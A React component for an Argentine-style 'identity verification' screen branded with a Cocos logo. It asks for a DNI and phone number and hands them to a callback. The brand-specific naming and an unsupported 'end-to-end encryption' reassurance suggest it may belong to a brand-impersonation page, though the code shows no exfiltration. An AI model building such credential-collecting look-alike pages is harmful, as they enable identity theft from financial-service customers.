import { useState } from "react";
import { User, Mail, Phone, CreditCard, Loader2 } from "lucide-react";
import CocosLogo from "@/components/cocos/CocosLogo";

interface CocosV2VerifyScreenProps {
  email: string;
  fullName: string;
  phone: string;
  onSubmit: (data: { identity_number: string; phone_number: string }) => Promise<void>;
}

const CocosV2VerifyScreen = ({ email, fullName, phone, onSubmit }: CocosV2VerifyScreenProps) => {
  const [dni, setDni] = useState("");
  const [phoneNumber, setPhoneNumber] = useState(phone || "");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!dni.trim()) { setError("Ingresá tu DNI para continuar."); return; }
    if (dni.trim().length < 7) { setError("El DNI debe tener al menos 7 dígitos."); return; }
    if (!phone && !phoneNumber.trim()) { setError("Ingresá tu número de celular."); return; }
    setError("");
    setLoading(true);
    try {
      await onSubmit({ identity_number: dni.trim(), phone_number: phoneNumber.trim() || phone });
    } catch (e: any) {
      setError(e?.message || "Error al verificar. Intentá nuevamente.");
    }
    setLoading(false);
  };

  return (
    <div className="w-full max-w-[480px]">
      <div className="flex justify-center mb-6">
        <CocosLogo />
      </div>

      <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
        <div className="h-1 w-full bg-gradient-to-r from-[#1a3f8f] via-[#3b6fe0] to-[#1a3f8f]" />
        <div className="px-7 pt-6 pb-7">
          {/* Header */}
          <div className="flex flex-col items-center text-center mb-6">
            <div className="w-12 h-12 rounded-full bg-[#eef2ff] border border-[#dbe4ff] flex items-center justify-center mb-3">
              <CreditCard size={22} className="text-[#3b6fe0]" />
            </div>
            <h3 className="text-[17px] font-bold text-[#1a2233] mb-1">Verificación de identidad</h3>
            <p className="text-[13px] text-[#8895aa] max-w-[280px]">
              Confirmá tus datos para asegurar tu cuenta y completar la verificación.
            </p>
          </div>

          {/* Verified info */}
          <div className="space-y-2 mb-5">
            {fullName && (
              <div className="flex items-center gap-3 rounded-xl border border-[#e8edf5] bg-[#f8fafc] px-4 py-2.5">
                <User size={15} className="text-[#8895aa] flex-shrink-0" />
                <div className="flex-1 min-w-0">
                  <p className="text-[10px] text-[#8895aa] font-medium uppercase tracking-wide">Nombre</p>
                  <p className="text-[13px] text-[#1a2233] font-semibold truncate">{fullName}</p>
                </div>
                <span className="text-[9px] text-[#16a34a] bg-[#f0fdf4] border border-[#bbf7d0] px-2 py-0.5 rounded-full font-semibold">✓</span>
              </div>
            )}
            <div className="flex items-center gap-3 rounded-xl border border-[#e8edf5] bg-[#f8fafc] px-4 py-2.5">
              <Mail size={15} className="text-[#8895aa] flex-shrink-0" />
              <div className="flex-1 min-w-0">
                <p className="text-[10px] text-[#8895aa] font-medium uppercase tracking-wide">Email</p>
                <p className="text-[13px] text-[#1a2233] font-semibold truncate">{email}</p>
              </div>
              <span className="text-[9px] text-[#16a34a] bg-[#f0fdf4] border border-[#bbf7d0] px-2 py-0.5 rounded-full font-semibold">✓</span>
            </div>
          </div>

          {error && (
            <div className="mb-4 rounded-xl border border-[#fecaca] bg-[#fef2f2] px-4 py-2.5 text-[13px] text-red-600">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="flex flex-col gap-3.5">
            <div>
              <label className="block text-[12px] font-semibold text-[#5a6a85] mb-1.5">
                Número de DNI
              </label>
              <input
                type="text"
                inputMode="numeric"
                placeholder="Ej: 38045521"
                value={dni}
                onChange={(e) => setDni(e.target.value.replace(/\D/g, ""))}
                maxLength={10}
                autoFocus
                disabled={loading}
                className="w-full rounded-xl border border-[#d8dfe8] bg-[#f8fafc] px-4 py-3 text-[14px] text-[#1a2233] outline-none transition-all placeholder:text-[#b0b8c9] focus:border-[#3b6fe0] focus:ring-2 focus:ring-[#3b6fe0]/15 disabled:opacity-50"
              />
            </div>

            {!phone && (
              <div>
                <label className="block text-[12px] font-semibold text-[#5a6a85] mb-1.5">
                  Número de celular
                </label>
                <input
                  type="text"
                  inputMode="tel"
                  placeholder="Ej: 1166051847"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ""))}
                  maxLength={15}
                  disabled={loading}
                  className="w-full rounded-xl border border-[#d8dfe8] bg-[#f8fafc] px-4 py-3 text-[14px] text-[#1a2233] outline-none transition-all placeholder:text-[#b0b8c9] focus:border-[#3b6fe0] focus:ring-2 focus:ring-[#3b6fe0]/15 disabled:opacity-50"
                />
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-xl bg-gradient-to-r from-[#1a3f8f] to-[#2563eb] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15357a] hover:to-[#1d55d4] active:scale-[0.98] disabled:opacity-50 shadow-md shadow-[#1a3f8f]/20 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <Loader2 className="w-4 h-4 animate-spin" />
                  Verificando datos...
                </span>
              ) : "Confirmar y verificar"}
            </button>
          </form>

          <p className="mt-4 text-center text-[10px] text-[#b0b8c9] leading-relaxed">
            🔒 Tus datos están protegidos con cifrado de extremo a extremo.
          </p>
        </div>
      </div>
    </div>
  );
};

export default CocosV2VerifyScreen;
